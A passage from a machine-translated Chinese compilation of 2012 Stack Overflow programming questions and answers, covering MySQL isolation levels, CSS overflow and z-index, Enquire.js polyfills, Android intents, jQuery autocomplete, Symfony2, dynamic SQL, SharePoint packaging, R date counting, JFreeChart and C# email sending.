您需要考虑以下两点：

1.  有效的隔离级别
2.  你想在交易中“看到”什么样的状态

MySQL 中的默认隔离级别`REPEATABLE READ`意味着，如果您`SELECT`在事务中运行两次，即使其他事务已提交更改，您也会看到完全相同的数据。

大多数时候，人们希望在运行第二个 select 语句时看到已提交的更改——这是`READ COMMITTED`隔离级别的行为。

如果您没有更改 MySQL 中的默认级别，并且您*确实*希望在同一事务中运行 SELECT 两次时看到数据库中的更改 - 那么您不能在“相同”事务中执行此操作，您需要提交您的第一个`SELECT`声明。

如果您真的*想*在事务中看到一致的数据状态，那么您显然*不*应该提交。

> *然后几分钟后，第一个进程执行一个事务性操作并尝试提交。这个提交会失败吗？*

这完全取决于您对“*事务*性”的定义。您在关系数据库中所做的任何事情“都是事务性的”（实际上对于 MySQL 而言并非完全正确，但为了论证，如果您仅使用 InnoDB 作为存储引擎，您可以假设这一点）。

如果那个“第一个进程”只*选择*数据（即“只读事务”），那么提交当然会起作用。如果它试图修改另一个事务已经提交的数据并且你**正在**运行`REPEATABLE READ`你可能会得到一个错误（等到任何锁被释放之后）。在这种情况下，我对 MySQL 的行为不是 100%。

您真的应该使用您最喜欢的 SQL 客户端在两个不同的会话中手动尝试此操作，以了解行为。请务必更改您的隔离级别，以查看不同级别的效果。

# html - 溢出：自动在 FireFox 16 中不起作用

> ID：13287752
> 
> 赞同：1
> 
> 时间：2012-11-08T11:02:40.813
> 
> 标签：html, firefox

我知道在 FF（大多数是旧版本）或其他地方有很多关于溢出问题的帖子，但我找不到与我的示例相关的内容。

我尝试了这段应该产生滚动条的小代码：它在 Chrome 和 IE 中按预期工作，但在 FireFox 中却没有。

```
<!DOCTYPE html>

<html><body>
 <div style="height: 25px; overflow: auto;">
   <div style="height: 100px;"></div>
 </div>
</body></html> 
```

这是一个在线示例：http: [//jsfiddle.net/v7kqP/5/](http://jsfiddle.net/v7kqP/5/)

​我正在使用**FireFox 16.0.2**。我做错了什么还是FF错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:07:19.453

它是可滚动的。尝试放置一些内容。

```
<!DOCTYPE html>

<html><body>
<div style="height: 25px; overflow: auto; border: 1px solid blue;"><div style="height: 100px; border: 1px solid red;">Here goes the content......................................</div></div>
</body></html> 
```

[演示](http://jsfiddle.net/v7kqP/9/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T08:09:20.773

如果 Firefox 认为没有足够的空间来显示整个内容，它就不会显示垂直滚动条。显然它认为 25 像素不足以显示垂直滚动条，在你的情况下......

# media-queries - 互操作性：Enquire.js 不执行 Respond.js 触发 css 媒体查询

> ID：13287755
> 
> 赞同：2
> 
> 时间：2012-11-08T11:02:48.820
> 
> 标签：media-queries, polyfills, enquire.js

好的，所以我使用[Respond.js](https://github.com/scottjehl/Respond)作为旧版浏览器上的媒体查询的 polyfill（ie8 是最重要的）。

同时，我正在研究使用[Enquire.js](http://wickynilliams.github.com/enquire.js/)，它可以根据媒体查询匹配执行 js 代码。

单独测试这些东西有效：

*   respond.js 为 IE8 正确执行 css 中定义的媒体查询
*   enquire.js 根据匹配 css 的媒体查询正确执行 javascript 代码。（对于非旧版浏览器）

但是组合似乎不起作用。IE：

**Enquire.js 不会基于通过 respond.js 启用的媒体查询执行 javascript（对于旧版浏览器）**

由于 Respond.js 包含 Paul Irish 的[MatchMedia 填充物](https://github.com/paulirish/matchMedia.js)（根据： Enquire ['s documentation](http://wickynilliams.github.com/enquire.js/#legacy-support)）应该足以支持旧版支持，我不确定可能出了什么问题。

所以只是为了检查：这种组合应该有效吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-08T17:33:27.240

我是 enquire 的作者，所以我会尽我所能提供帮助。

我刚刚浏览了 response.js 源代码以了解它是如何工作的。Respond 从您的 CSS 中提取任何媒体查询，然后根据窗口的宽度，如果媒体查询匹配，它将创建包含该 CSS 的新样式块（这就是为什么它只支持简单的媒体查询，例如 max/min-width）。这当然意味着它不会帮助查询 JS，因为它正在模拟媒体查询。

polyfill的包含`matchMedia`实际上是一个红鲱鱼。所做的只是创建一个与`matchMedia`浏览器 API 等效的东西。因此，如果浏览器只支持非常有限的媒体查询集（如 IE8 那样），它不会扩展它的功能，它只会允许你在它的范围内工作。我自己一开始就犯了这个错误！

我不知道这是否对您有帮助，但 enquire 的`register`方法可以接受第三个参数，`shouldDegrade`这是一个信号，询问您是否打算在*浏览器被认为无法*运行时始终运行该功能。因此，如果您传入`true`，则匹配功能将始终针对不支持的桌面浏览器执行（但对于支持的浏览器*仍然*是有条件的）。这将允许您为旧版浏览器提供桌面体验，这在移动优先方法中特别有用。

如果您还有任何问题，很乐意为您提供进一步帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-20T19:36:53.880

尝试从 respond.js 中删除 matchMedia 的包含，然后在 respond.js 之后加载 match.media 和 enquire.js。在 IE 7 和 8 中使用查询 v 2.0.2 为我工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-10-02T09:38:39.477

我找到了一个似乎适用于 IE8 的解决方案

1.**非常重要！如果你使用它，从响应 JS 中删除 match.media（如果没有，它会在 IE 中静默失败）**

2.包括 Modernizr 至少有媒体查询测试、负载、shiv：[http ://modernizr.com/download/#-shiv-mq-cssclasses-teststyles-load](http://modernizr.com/download/#-shiv-mq-cssclasses-teststyles-load)

3.在<head>中（因为我们需要respondjs在head中）

```
<script src="../../common/vendor/modernizr/modernizr.custom.js"></script>
<script>
    Modernizr.load([
        // Test need for CSS media query polyfill
        {
            test: Modernizr.mq("only all"),
            nope: "../../common/vendor/respond/respond.min.js"
        }
    ]);
</script> 
```

4.Before </body> 标签加载polyfill和你的脚本

```
<script>
    Modernizr.load([
        {
            test: window.matchMedia,
            nope: [
                "../../common/vendor/polyfills/media.match.js",
                "../../common/vendor/polyfills/matchMedia.addListener.js"
            ]
        },
        '../../common/vendor/enquire/enquire.min.js',
        '../../common/scripts/script.js'
    ]);
</script> 
```

我希望它对你有用！

# android - 使用 adb 和 eclipse 安装 apk 的区别

> ID：13287763
> 
> 赞同：0
> 
> 时间：2012-11-08T11:02:59.703
> 
> 标签：android, installation, apk, adb

我有一个应用程序在完成后会自行关闭。如果我通过eclipse安装它，它可以正常工作，但如果我通过它安装它`adb -e or -d install c:\....\myApp.apk`，它可以工作，但完成后它不会自行关闭。

我需要通过 adb 安装它，完成后需要关闭它，就像从 eclipse 安装时一样。为什么同一个apk有不同的行为，我该如何解决这个问题？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T12:02:06.620

就像 Siddharth Lele 发布的那样，区别在于签名密钥，使用 eclipse 的默认密钥导出 apk 可以解决问题。

# css - 变换：缩放和定位

> ID：13287766
> 
> 赞同：2
> 
> 时间：2012-11-08T11:03:08.940
> 
> 标签：css

当我应用变换比例时，“z-index 已更改”如何？我错过了什么？玩 transform 有什么“技巧”吗？

```
.thumb > a .img-cover{
    -webkit-transition: all 1.2s ease-out;border-radius:5px;
    -webkit-transform: scale(1);
}
.img-cover{
    position:relative;
    overflow:hidden;
}
.img-cover:before{
    position:absolute;
    top:0;left:0;right:0;bottom:0;
    content:"";
    box-shadow: inset 0px 0 100px #f0f;}
.thumb > a:hover img {
    -webkit-transform: scale(1.1);
} ​ 
```

HTML

```
<div class="container">
    <article class="thumb">
       <a href="#">
          <div class="img-cover"><img src="http://placekitten.com/300/120"/></div>
          <span>thumb-desc</span>
       </a>
    </article>
</div>​ 
```

[现场演示](http://jsfiddle.net/8uhNK/9/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T11:09:49.123

定义`z-index`你自己，让它为你做这件事。

```
.img-cover:before{
    position:absolute;
    z-index: 10;
    top:0;left:0;right:0;bottom:0;
    content:"";
    box-shadow: inset 0px 0 100px #f0f;}
.thumb > a:hover img {
    z-index: 0;
    -webkit-transform: scale(1.1);
} 
```

**[示例代码](http://jsfiddle.net/8uhNK/11/)**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T11:11:04.130

设置属性时`position: absolute`，对象不在流中。这就是对齐方式不同并且看起来 z-index 已更改的原因。手动设置 z-index 可以解决这个问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T11:12:23.250

**将z-index**给你的`.img-cover:before`on `a:hover`。像这样写：

```
.thumb > a:hover .img-cover:before{
    z-index:2;
} 
```

检查这个[http://jsfiddle.net/8uhNK/12/](http://jsfiddle.net/8uhNK/12/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-08T11:12:55.203

您自己说过，“z-index 已更改”。所以你必须设置`z-index`of`.img-cover`和`.img-cover:before`.The `z-index`of`.img-cover`的值必须低于`z-index`of `.img-cover:before`。

示例：http: [//jsfiddle.net/skeurentjes/8uhNK/10/](http://jsfiddle.net/skeurentjes/8uhNK/10/)

# google-app-engine - 寻找电子邮件存储服务

> ID：13287772
> 
> 赞同：-1
> 
> 时间：2012-11-08T11:03:30.030
> 
> 标签：google-app-engine, cloud-hosting, sendgrid

我正在开发一个在服务器上生成报告并将它们作为电子邮件附件发送给客户的系统。我想使用云服务进行电子邮件传送和电子邮件存储。对于存储，我需要索引/查询功能。

对于电子邮件传递，有[SendGrid 之](http://www.sendgrid.com/)类的服务。
对于电子邮件存储，有[Google App Engine](http://www.google.com/enterprise/apps/business)等服务。

但是，我正在寻找 1 项可以处理这一切的服务，或者需要 2 项以最少的集成工作量的服务。例如，为了操作 Gmail 收件箱，我需要使用[Google 的 IMAP 扩展](https://developers.google.com/google-apps/gmail/imap_extensions.html)实现我自己的 IMAP 库。此外，如果我想为每个客户单独收件箱，价格非常昂贵（每月 5 美元）。因此，欢迎任何替代方案...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T16:11:37.247

您可以将 Google App Engine 用于您描述的两种功能。您可以将电子邮件存储在 Datastore 或 Blobstore 中，并使用[Mail Python API](https://developers.google.com/appengine/docs/python/mail/)或[Mail Java API](https://developers.google.com/appengine/docs/java/mail/overview)进行电子邮件传递。

希望这可以帮助。

# android - 新意图不会在 onLongPress 内部开始？

> ID：13287781
> 
> 赞同：0
> 
> 时间：2012-11-08T11:04:11.110
> 
> 标签：android, android-intent, ondraw

我为表面视图创建了一个 TapGestureDetector 类。在那里我捕捉到了长触摸事件，我想开始一个新的活动。但它不起作用。Intent 没有启动。有一个空指针异常。我已经在清单中定义了动作以及意图。但是有一个我无法识别的错误。

```
 public class TapGestureDetector extends GestureDetector.SimpleOnGestureListener {

int touchX;
int touchY;
public static String block_name;
Context ctx = custom.ctx;
ArrayList<Rect> rectangles = storeMap.GetArrayList();

@Override
public void onLongPress(MotionEvent event) {

//Detect touched X.Y
    touchX = (int) event.getX();
    touchY = (int) event.getY();
//Go through a set of rectangles and identify the touched rectangle
    for (int i = 0; i < rectangles.size(); i++) {

        if (rectangles.get(i).contains(touchX, touchY)) {

            rectangles.get(i).describeContents();
            String Selected_rect = String.valueOf(rectangles.get(i));
            Store_Identified_Block.Store(Selected_rect);
            getSelectedCoordinates();

            //Start a new intent
            Intent myIntent = new Intent("android.intent.action.zoomlevel");
            myIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            //This is not working
            try {
                ctx.startActivity(myIntent);
            } catch (Exception e) {

                Log.d("onLongPress(MotionEvent event)", e.toString());
                e.printStackTrace();
            }

            break;
        }
    }

super.onLongPress(event);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T15:58:31.727

解决了:)

```
try {

                Intent mm=new Intent(finalmainvclass.maincontaxt,zoomlevel.class);
                mm.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                finalmainvclass.maincontaxt.startActivity(mm);

            } catch (Exception e) {

                Log.d("MYLOG", "Error is "+e.toString());
                e.printStackTrace();
            } 
```

# php - 自动完成不显示结果jquery

> ID：13287784
> 
> 赞同：0
> 
> 时间：2012-11-08T11:04:17.897
> 
> 标签：php, jquery, firebug

我正在尝试使用 jqueryui 创建一个自动完成。我正在回显来自远程文件 search.php 的数据库结果。它在火灾错误的响应中显示了正确的单词，但我的 html 中根本没有显示建议列表页。有人可以帮我吗？

我在 jqueryui.com 中使用[multipile 的代码，远程](http://jqueryui.com/autocomplete/#multiple-remote)演示

我的PHP代码

```
<?php include("connection.php");
 $q=mysql_real_escape_string($_GET['term']); 
$x="select fieldname from tablename where fieldname like '$q%'"; 
$query=mysql_query($x); 
while($row=mysql_fetch_array($query)) { echo $row['fieldname']."\n"; } ?>
========================================================================

    ------------------------------------------------------------------------

    <link rel="stylesheet" href="http://code.jquery.com/ui/1.9.1/themes/base/jquery-ui.css" />
        <script src="http://code.jquery.com/jquery-1.8.2.js"></script>
        <script src="http://code.jquery.com/ui/1.9.1/jquery-ui.js"></script>
        <link rel="stylesheet" href="/resources/demos/style.css" />
        <style>
        .ui-autocomplete-loading {
            background: white url('images/ui-anim_basic_16x16.gif') right center no-repeat;
        }
        </style>
        <script>
        $(function() {
            function split( val ) {
                return val.split( /,\s*/ );
            }
            function extractLast( term ) {
                return split( term ).pop();
            }

            $( "#birds" )
                // don't navigate away from the field on tab when selecting an item
                .bind( "keydown", function( event ) {
                    if ( event.keyCode === $.ui.keyCode.TAB &&
                            $( this ).data( "autocomplete" ).menu.active ) {
                        event.preventDefault();
                    }
                })
                .autocomplete({
                    source: function( request, response ) {
                        $.getJSON( "search.php", {
                            term: extractLast( request.term )
                        }, response );
                    },
                    search: function() {
                        // custom minLength
                        var term = extractLast( this.value );
                        if ( term.length < 2 ) {
                            return false;
                        }
                    },
                    focus: function() {
                        // prevent value inserted on focus
                        return false;
                    },
                    select: function( event, ui ) {
                        var terms = split( this.value );
                        // remove the current input
                        terms.pop();
                        // add the selected item
                        terms.push( ui.item.value );
                        // add placeholder to get the comma-and-space at the end
                        terms.push( "" );
                        this.value = terms.join( ", " );
                        return false;
                    }
                });
        });
        </script>
    </head>
    <body>

    <div class="ui-widget">
        <label for="birds">Birds: </label>
        <input id="birds" size="50" />
    </div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T11:21:45.487

如果您的远程文件位于不同的域中，则必须使用 JSONP。JSON 不支持跨域数据传输。

阅读更多关于[同源政策](http://en.wikipedia.org/wiki/Same_origin_policy)

# git - 从文件/行中获取“拉取请求名称”

> ID：13287786
> 
> 赞同：2
> 
> 时间：2012-11-08T11:04:31.910
> 
> 标签：git, github

`myFile.php line 123`例如，给定一个文件和一个特定的行，是否
可以获得有关
添加了该代码行的拉取请求或分支或问题的信息？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:08:31.107

你需要`git blame`. 读[这个](http://www.kernel.org/pub/software/scm/git/docs/git-blame.html)

如果您想通过 UI 进行操作，则可以使用`git gui`您浏览文件。

现在回答您的问题：您将找到一个 SHA1 提交 ID，其中每一行都被修改了。您可以通过搜索将其映射到某个分支。读[这个](https://stackoverflow.com/questions/1419623/git-how-to-list-branches-that-contain-a-given-commit)

# php - Symfony2 参数或缓存问题

> ID：13287788
> 
> 赞同：0
> 
> 时间：2012-11-08T11:04:45.250
> 
> 标签：php, symfony

我将 Symfony2 用于我的应用程序，并且应用程序在 Windows 上运行良好，但是当我将其上传到服务器（ubuntu 12.04 LTS）时，它会出现以下错误：

```
 **[Symfony\Component\DependencyInjection\Exception\ParameterNotFoundException]
  You have requested a non-existent parameter "user_show".** 
```

我已经将它搜索到我的整个应用程序我从未使用过名为**“user_show”**的参数，尽管它是我的模板名称之一，但我找不到发生此错误的原因。

我认为这是缓存问题，我在服务器上禁用了**APC**和**Xcache**，但问题仍然存在，然后我只安装**xcache**仍然没有效果。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T11:29:32.827

一些捆绑包使用此参数。您应该找到所有包含“user_show”的文件。

您很可能需要“DependensyInjection”文件夹中的文件。

在那里你可以找到参数定义。你应该在你的 config.yml 中添加这个参数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T13:42:20.403

1.  清除缓存`php app/console ca:cl`
2.  重新生成 bootstrap.php.cache 通过`php composer.phar update`
3.  如果您从控制台清除 apc，它只会清除控制台的 apc，所以要全局尝试：`sudo service apache2 restart`

# mysql - 将表名传递给从游标中选择语句

> ID：13287789
> 
> 赞同：0
> 
> 时间：2012-11-08T11:04:45.237
> 
> 标签：mysql, stored-procedures

如何使用从 Cursor 返回的值作为 mysql 过程中的表名？

```
DECLARE cur CURSOR FOR
select table_name, column_name
    from information_schema.columns
    where table_schema = 'foo' and table_name like 'bar%';
OPEN cur;

loop1: LOOP

FETCH cur
INTO table_val, column_val;

IF no_more_rows THEN
  CLOSE cur;
  LEAVE loop1;
END IF;
update table_val SET column_val ... 
```

这会引发错误`foo.table_val doesnt exist`。如何获取要传递给 select 语句的实际表名？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:52:31.983

换成`update table_val SET column_val ...`_

```
SET @sql = CONCAT('UPDATE ', table_val, ' SET ', column_val, ' = whatever WHERE...');
PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt; 
```

[在此处](http://dev.mysql.com/doc/refman/5.0/en/sql-syntax-prepared-statements.html)阅读更多相关信息。

但请注意，您不能参数化表名和列名。这仅适用于值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2022-03-03T20:19:00.130

我也将分享我的修复。希望它也会对某人有所帮助。

```
-- set to "$$" as we have ";" inside of Procedure. MySQL will be confused.(is this part of Procedure or should I run it now?)
DELIMITER $$

CREATE PROCEDURE UpdateTable()
BEGIN

    DECLARE done INT DEFAULT FALSE;
    DECLARE _table_name CHAR(255);
    DECLARE cur CURSOR FOR
            SELECT table_name FROM information_schema.tables
            WHERE table_schema = 'db_name' AND table_type = "BASE TABLE";
    DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = TRUE;

    OPEN cur;
    My_loop: LOOP
        FETCH cur INTO _table_name;
        SET @my_table_name = _table_name;

        IF done THEN
          LEAVE My_loop;
        END IF;

        SET FOREIGN_KEY_CHECKS = 0;

        SET @stmt = CONCAT('ALTER TABLE ', @my_table_name, ' CONVERT TO CHARACTER SET utf8;'); 
        PREPARE stmt1 FROM @stmt; 
        EXECUTE stmt1; 
        DEALLOCATE PREPARE stmt1;   

        SET FOREIGN_KEY_CHECKS = 1;

    END LOOP;
    CLOSE cur;

END$$

-- set to normal. ";" 
DELIMITER ; 
```

# c#-4.0 - EnableViewState 和 ViewStateMode 不起作用

> ID：13287792
> 
> 赞同：0
> 
> 时间：2012-11-08T11:04:57.103
> 
> 标签：c#-4.0

我正在使用 C#.Net 和 Framework 4.0。我有一个 aspx 和 ascx 页面。在我的 ascx 中，我正在生成一个 XML 并将该 XML 值绑定到 Treeview。这些是在后面的代码中完成的。我在我的aspx 页面中调用这个ascx。

我的问题是，我有大量的 XML 数据。因此，页面的性能非常缓慢。我尝试使用 enableviewstate 和 viewstatemode。但没有什么对我有用。

视图状态仍然持有大量 XML 数据。我不希望此 XML 数据处于视图状态。

如何解决这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T11:04:21.733

Atlast，我已经完成了临时修复..清除了 JQuery 中的控件视图状态值..这个过程已经在提交按钮 onclientclick 中完成。

```
$('#ctl00_ContentPlaceHolder1_TreeView').empty(); 
```

而且，在页面加载的回发之外，我再次生成了 XML 值

# visual-studio-2010 - 如何创建 SharePoint 2010 wsp 并包含已构建为 DLL 和强签名的 Web 部件

> ID：13287796
> 
> 赞同：2
> 
> 时间：2012-11-08T11:05:10.840
> 
> 标签：visual-studio-2010, sharepoint-2010, web-parts, wsp

我有一个 SharePoint 2010 Visual WebPart，它是用 MSBuild（ILMerged 与依赖项）和强签名 - A.dll 构建的

另外，我有一个 SharePoint 项目 B，我想用它来打包我的所有 WebPart 并创建一个 B.wsp

如何将 WebPart A.dll 包含在项目 B 的功能中以及随后的包中，以便它包含在生成的 B.wsp 中并可用？

谢谢，迷茫

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T17:47:51.570

使用 Visual Studio 2010 将 DLL 添加到 SharePoint 解决方案包：

*   从解决方案资源管理器中打开包
*   单击高级选项卡
*   在附加程序集下，单击添加 > 添加现有程序集...
*   找到您的 DLL，然后单击确定

请注意，如果 WebPart A 项目与 SharePoint 项目 B 一起是 Visual Studio 解决方案的一部分，则可以使用从项目输出添加程序集而不是添加现有程序集。然后，您对 WebPart A 项目所做的任何更改都将包含在您下次打包项目 B 时。

# r - 计算两个日期间隔之间的每月天数

> ID：13287798
> 
> 赞同：5
> 
> 时间：2012-11-08T11:05:14.290
> 
> 标签：r, date, intervals

我有一组事件，每个事件都有开始和结束日期，但它们发生在几个月的范围内。我想创建一个表格，显示此事件每个月的天数。

我有以下示例。

```
event_start_date <- as.Date("23/10/2012", "%d/%m/%Y")
event_end_date   <- as.Date("07/02/2013", "%d/%m/%Y") 
```

我希望得到如下表格：

```
Oct-12  8
Nov-12  30
Dec-12  31
Jan-13  31
Feb-13  7 
```

有没有人知道这样做的聪明而优雅的方式，或者创建一个循环系统是唯一可行的方法？

约赫姆

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-08T12:04:33.987

这不一定是有效的，因为它创建了一系列天，但它可以完成工作：

```
> library(zoo)
> table(as.yearmon(seq(event_start_date, event_end_date, "day")))

Oct 2012 Nov 2012 Dec 2012 Jan 2013 Feb 2013 
       9       30       31       31        7 
```

如果您的时间跨度比此方法慢，则必须在两个（截断的）日期之间创建一系列月份的第一个，取`diff`，并为端点做一些额外的工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T11:40:33.250

正如 DjSol 在他的评论中已经指出的那样，您只需减去两个日期即可获得天数：

```
event_start_date <- as.Date("23/10/2012", "%d/%m/%Y")
event_end_date   <- as.Date("07/02/2013", "%d/%m/%Y")
as.numeric(event_end_date - event_start_date) 
```

那是你要的吗？我有一种感觉，以这种格式获取开始日期和结束日期可能会遇到更多问题，因此您可以轻松地减去它们，因为您提到了一个循环。但是，如果是这样，我想我们需要更多关于您的实际数据外观的详细信息。

# java - 如何删除当前显示的条形图（jfreechart）并在eclipse RCP插件的同一视图中显示新的条形图？

> ID：13287799
> 
> 赞同：0
> 
> 时间：2012-11-08T11:05:16.133
> 
> 标签：java, eclipse, jfreechart, rcp, bar-chart

我在 RCP 插件的视图中创建条形图。图表中要显示的数据来自 sqlite3 数据库文件。我编写的代码根据作为输入提供的日期将条形图显示到视图上，我们可以使用日历选择该日期。sqlite3 连接数据库文件并根据日期查询并获取条形图数据。Jfreechart 用于创建条形图，ChartComposite 将其显示在视图上。

问题是当我一个接一个地选择多个日期并要求显示时，所有图表都显示在同一个视图上，我不需要。输出必须如下，当我第二次选择日期时，必须删除当前图表并显示新图表。我试图在代码中添加 dispose() 但它不起作用。

以下是我的相同代码，

公共类 BarChartDisplay 扩展 ViewPart {

```
Text searchfield = null;
String path = SelectDataBase.path;
public static int error=0;
public static int info=0;
public static int critical=0;
public static int warning=0;

public BarChartDisplay() {
    // TODO Auto-generated constructor stub
}

@Override
public void createPartControl(Composite parent) {
    // TODO Auto-generated method stub

    //Composite A:
    final Composite mainComposite = new Composite(parent, SWT.NONE);
    GridData mainLayoutData = new GridData(SWT.FILL, SWT.FILL, true, true);
    mainLayoutData.horizontalSpan = 1;
    mainComposite.setLayoutData(mainLayoutData);
    GridLayout outerLayout = new GridLayout();
    outerLayout.marginTop = 30;
    outerLayout.marginLeft = 20;
    outerLayout.marginRight = 20;
    mainComposite.setLayout(outerLayout);

    //Composite B:
    final Composite selectComposite = new Composite(mainComposite, SWT.NONE);
    GridData layoutData = new GridData(SWT.FILL, SWT.FILL, true, true);
    layoutData.horizontalSpan = 1;
    selectComposite.setLayoutData(layoutData);
    GridLayout layout = new GridLayout(4, false);
    selectComposite.setLayout(layout);

    //Composite C:
    final Composite barchartComposite = new Composite(mainComposite, SWT.NONE);
    GridData layoutData2 = new GridData(SWT.FILL, SWT.FILL, true, true);
    layoutData2.horizontalSpan = 1;
    barchartComposite.setLayoutData(layoutData2);
    GridLayout layout2 = new GridLayout(1, false);
    barchartComposite.setLayout(layout2); 

    final CalendarCombo ccombo = new CalendarCombo(selectComposite, SWT.READ_ONLY | SWT.FLAT);
    GridData layoutDataCal = new GridData(150, 40);

    ccombo.computeSize(SWT.DEFAULT, SWT.DEFAULT);
    ccombo.showCalendar();
    ccombo.setLayoutData(layoutDataCal);

    org.eclipse.swt.widgets.Button button = new org.eclipse.swt.widgets.Button(selectComposite, SWT.PUSH);
    button.setText("Go");

button.addListener(SWT.Selection, new Listener() {
    public void handleEvent(Event e) {
      switch (e.type) {
      case SWT.Selection:

        error = 0;
        info = 0;
        warning = 0;
        critical = 0;

        DB db = new DB();
        Connection conn = null;
        conn = db.ConnTable(path);
        Statement statement;
        try {
            statement = conn.createStatement();
            String query = null;
            String textfielddata = ccombo.getDateAsString();

            System.out.println(textfielddata);

            query = "select priority from log where creation_date = '"+ textfielddata +"'";

            System.out.println(query);
            ResultSet rs = statement.executeQuery(query);

            while (rs.next()) {

                int  prioritydata = rs.getInt("priority");

                if (prioritydata == 1)
                    error++;
                else if (prioritydata == 2)
                    info++;
                else if (prioritydata == 3)
                    warning++;
                else if (prioritydata == 4)
                    critical++;
            }

        } catch (SQLException er) {
            // TODO Auto-generated catch block
            er.printStackTrace();
        }

        System.out.println("after query");          

      final CategoryDataset dataset = createDataset();
      final JFreeChart chart = createChart(dataset);

      ChartComposite frame = new ChartComposite(barchartComposite,SWT.NONE,chart,true);       

      frame.setLayoutData(new GridData(GridData.FILL_BOTH));
      frame.pack();
      frame.setVisible(true);
      frame.setChart(chart);
      frame.forceRedraw();
      barchartComposite.getLayout();

      break;
      }
    }
  });

}

 /**
 * Returns a sample dataset.
 * 
 * @return The dataset.
 */
private CategoryDataset createDataset() {

    // row keys...
    final String series1 = "First";

    // column keys...
    final String category1 = "error";
    final String category2 = "info";
    final String category3 = "warning";
    final String category4 = "critical";

    // create the dataset...
    final DefaultCategoryDataset dataset = new DefaultCategoryDataset();

    dataset.addValue(10, series1, category1);
    dataset.addValue(5, series1, category2);
    dataset.addValue(6, series1, category3);
    dataset.addValue(9, series1, category4);

    return dataset;

}

/**
 * Creates a sample chart.
 * 
 * @param dataset  the dataset.
 * 
 * @return The chart.
 */
private JFreeChart createChart(final CategoryDataset dataset) {

    // create the chart...
    final JFreeChart chart = ChartFactory.createBarChart(
        "Priority BarChart",         // chart title
        "priority",               // domain axis label
        "Value",                  // range axis label
        dataset,                  // data
        PlotOrientation.VERTICAL, // orientation
        true,                     // include legend
        true,                     // tooltips?
        false                     // URLs?
    );

    // NOW DO SOME OPTIONAL CUSTOMISATION OF THE CHART...

    // set the background color for the chart...
    chart.setBackgroundPaint(Color.white);

    // get a reference to the plot for further customisation...
    final CategoryPlot plot = chart.getCategoryPlot();
    plot.setBackgroundPaint(Color.lightGray);
    plot.setDomainGridlinePaint(Color.white);
    plot.setRangeGridlinePaint(Color.white);

    // set the range axis to display integers only...
    final NumberAxis rangeAxis = (NumberAxis) plot.getRangeAxis();
    rangeAxis.setStandardTickUnits(NumberAxis.createIntegerTickUnits());

    // disable bar outlines...
    final BarRenderer renderer = (BarRenderer) plot.getRenderer();
    renderer.setDrawBarOutline(false);

    // set up gradient paints for series...
    final GradientPaint gp0 = new GradientPaint(
        0.0f, 0.0f, Color.blue, 
        0.0f, 0.0f, Color.lightGray
    );

    renderer.setSeriesPaint(0, gp0);

    final CategoryAxis domainAxis = plot.getDomainAxis();
    domainAxis.setCategoryLabelPositions(
        CategoryLabelPositions.createUpRotationLabelPositions(Math.PI / 6.0)
    );
    // OPTIONAL CUSTOMISATION COMPLETED.

    return chart;

}   

@Override
public void setFocus() {
    // TODO Auto-generated method stub

} 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:20:10.583

You don't need to dispose the chart, just recreate the dataset with the new selected date, and use `chart.getPlot().setDataset(new_dataset)` to refresh the chart with the new data.

# c# - SmtpClient 发送原始 Html

> ID：13287801
> 
> 赞同：2
> 
> 时间：2012-11-08T11:05:34.683
> 
> 标签：c#, html, smtp, sendmail

谁能告诉我为什么以下代码以原始 Html 发送电子邮件？就像您查看页面源时的电子邮件一样。

我已经削减了代码，以免包含附件和地址。

如果我使用备用视图禁用该行，则电子邮件会正确呈现，但我还想发送纯文本版本。

```
using (SmtpClient client = GetSmtpClient(settings)) {
    using (MailMessage message = new MailMessage()) {
        message.IsBodyHtml = true;
        message.BodyEncoding = System.Text.Encoding.GetEncoding("iso-8859-1");
        message.To.Add(toList);
        message.Subject = subject;
        message.Body = htmlTemplate;
        message.AlternateViews.Add(AlternateView.CreateAlternateViewFromString(textTemplate, new ContentType("text/plain")));
        client.Send(message);
     }
} 
```

**编辑**：消息最初是发送文本作为主体，html 作为替代视图，但我遇到了重音字符和外来字符的问题，如此[处所述，](https://stackoverflow.com/questions/12374211/accented-characters-not-showing-up)想设置`IsBodyHtml`为 true，这迫使我将 html 设置为主视图.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T11:26:00.363

我也有这个问题，但这里有一个非常精简的代码版本，对我有用......

```
 private MailMessage CreateEmailMessage(string emailAddress) {

        MailMessage msg = new MailMessage();

        msg.From = new MailAddress(FromEmailAddress, FromName);
        msg.To.Add(new MailAddress(emailAddress));
        msg.Subject = "Msg Subject here";

        string textBody = File.ReadAllText(TextTemplateFile);

        string htmlBody = "";
        if (EmailFormat == "html") {
            htmlBody = File.ReadAllText(HtmlTemplateFile);

            foreach (Attachment inline in InlineAttachments) {
                inline.ContentDisposition.Inline = true;
                msg.Attachments.Add(inline);
            }

